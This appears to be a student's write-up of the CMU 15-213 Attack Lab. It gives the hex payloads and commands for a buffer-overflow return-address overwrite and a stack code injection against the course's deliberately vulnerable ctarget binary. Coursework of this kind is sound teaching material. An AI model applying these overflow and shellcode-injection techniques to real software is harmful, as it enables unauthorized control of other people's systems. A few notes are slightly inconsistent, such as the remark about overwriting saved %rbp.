# Lab 3: Attack Lab

This lab explores classic stack buffer overflows and return-oriented programming (ROP) using the provided Linux x86-64 targets.

---

## Environment Setup

- Same approach as Lab 2 ([lab2/README.md](cci:7://file:///Users/olegleyzerov/CascadeProjects/cmu-15213-labs/lab2/README.md:0:0-0:0)): run a Linux x86-64 userland via Docker on Apple Silicon and mount the working directory.
- Example:
```bash
docker run --rm -it --platform linux/amd64 -v .:/work ubuntu:20.04 bash
apt-get update
apt-get install -y binutils gdb make python3
```

---

## Tools

- `objdump -d <bin>` for disassembly
- `objdump -s -j .rodata <bin>` to inspect constants
- `gdb` for dynamic inspection
- `hex2raw` to convert hex-encoded payloads to raw input

---

## Level 1 (ctarget): Call touch1 via Stack Buffer Overflow

### Vulnerability recap
Buffer overflows arise when reading user input into a fixed-size stack buffer without length validation. By overflowing the buffer, we can overwrite the saved return address and redirect control flow.

### Recon
1. Disassemble the target:
```bash
objdump -d ctarget > ctarget.d
```

2. Find `getbuf` stack allocation (40 bytes):
```
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28      subq $0x28, %rsp    ; 0x28 = 40 bytes
```

3. Find `touch1` entry address:
```
00000000004017c0 <touch1>:
  4017c0: 48 83 ec 08      subq $0x8, %rsp
```

### Plan
- Fill 40 bytes to occupy the local buffer in `getbuf`.
- Overwrite the saved return address with the little-endian address of `touch1` (`0x4017c0` → bytes `C0 17 40 00 00 00 00 00` on x86-64).
- Feed the raw payload to `ctarget`.

### Payload (hex)
- 40 bytes of filler, then the 8-byte return address:
```
50 51 52 53 54 55 56 57 58 59
50 51 52 53 54 55 56 57 58 59
50 51 52 53 54 55 56 57 58 59
50 51 52 53 54 55 56 57 58 59
C0 17 40 00 00 00 00 00
```

### Execution
```bash
# Convert hex to raw and pipe to the target
./hex2raw < ctarget.11.txt | ./ctarget -q
```

Output:
```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
  user id  bovik
  course   15213-f15
  lab      attacklab
  result   1:PASS:0xffffffff:ctarget:1:50 51 ... C0 17 40 00 00 00 00 00
```

### Notes
- Stack frame math: 40 bytes for buffer → overwrite saved `%rbp` and then return address.
- Little-endian means the lowest-order byte of the address comes first in memory.

---

## Level 2 (ctarget): Inject code to call touch2(cookie)

### Goal
Call `touch2` while passing the 64-bit-extended cookie value as the first argument in `%rdi`.

### Why this differs from Level 1
Level 1 only needed a direct jump to `touch1` by overwriting the saved return address. For `touch2`, we must set up the argument register `%rdi` first. We’ll inject a few bytes of code into the stack buffer that:

1. Moves the cookie into `%rdi`.
2. Executes `ret`, so control transfers to `touch2`, whose address we place on the stack right after our overwritten return address.

### GDB recon (stack addresses)
- At function entry (break on `getbuf`):
  - `%rsp` = e.g., `0x5561dca0`
  - `&buf`  = e.g., `0x5561dc78`
- Distance: `0x5561dca0 - 0x5561dc78 = 0x28` (40 bytes)
  - Bytes 0..39: fill the buffer
  - Bytes 40..47: overwrite saved return address
  - Bytes 48..55: next 8 bytes popped by our injected `ret`

These values come from a live GDB run and show the classic 40-byte local array in `getbuf`.

### Injected code (x86-64)
- Set `%rdi` to cookie using `movabs` and then `ret`:
  - `movabs $COOKIE, %rdi` → opcode bytes: `48 BF <imm64>` (10 bytes total)
  - `ret` → `C3` (1 byte)

### Payload layout (little-endian)
1) Injected code in `buf`:
   - `48 BF <cookie 8 bytes> C3`
2) Padding with NOPs (`90`) to reach 40 bytes total so we land exactly at the saved return address overwrite.
3) Overwrite saved return address with `&buf` (8 bytes) so that `ret` from `getbuf` jumps into our injected code.
4) Next 8 bytes: address of `touch2` so our injected `ret` transfers to `touch2` with `%rdi` already set.

Byte-count sanity check:
- Code: 10 (movabs) + 1 (ret) = 11 bytes
- Padding: 29 bytes of `90` → 11 + 29 = 40
- Overwritten RA: 8 bytes (`&buf`)
- `touch2` address: 8 bytes
- Total payload length: 56 bytes

### Building the payload
Replace placeholders with your actual values:
- Cookie (from `cookie.txt`), e.g., `0x59b997fa` → use 64-bit immediate `0x0000000059b997fa`
- `&buf` (from GDB), e.g., `0x5561dc78` → bytes `78 DC 61 55 00 00 00 00`
- `touch2` address (from `objdump -d ctarget`), e.g., `0x4019a9` → bytes `A9 19 40 00 00 00 00 00`

Skeleton in hex (space-separated, for `hex2raw`):
```
48 BF FA 97 B9 59 00 00 00 00 C3
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90 90
78 DC 61 55 00 00 00 00
A9 19 40 00 00 00 00 00
```

Notes:
- The first line encodes `movabs $0x0000000059b997fa, %rdi; ret` (example cookie shown). Substitute your cookie bytes.
- The three lines of `90` are 29 total NOPs to reach 40 bytes before the return address overwrite.
- The last two lines are `&buf` (overwrite RA) and `touch2` (target of the injected `ret`).

### Execute
```bash
./hex2raw < ctarget.12.txt | ./ctarget -q
```

### Reflections / Tips
- Docker on Apple Silicon can prevent GDB from accessing registers due to the emulation layer. A Linux VM with proper debugging support (e.g., GitHub Codespaces) works smoothly.
- Always verify `&buf` and the exact `touch2` address in your current environment. ASLR is typically disabled for the lab binaries, but confirm within your session.
- Counting bytes and maintaining little-endian order is critical for reliability.

---

## Next Steps

There are four more assignments focusing on:
- Crafting returns to other `touch*` routines (with argument setup)
- Chaining gadgets for ROP to bypass limited direct injections
- Understanding calling conventions and stack discipline under attack scenarios

I’ll proceed to:
1) Document Level 2 (calling `touch2` with correct data).  
2) Document Level 3 (`touch3` with the cookie).  
3) ROP levels for `rtarget` (control flow with gadgets).  
4) Add tips for using `gdb` (`disas`, `x/gx`, `info frame`, `ni/si`) and notes on ASLR/canaries if relevant to the target build.
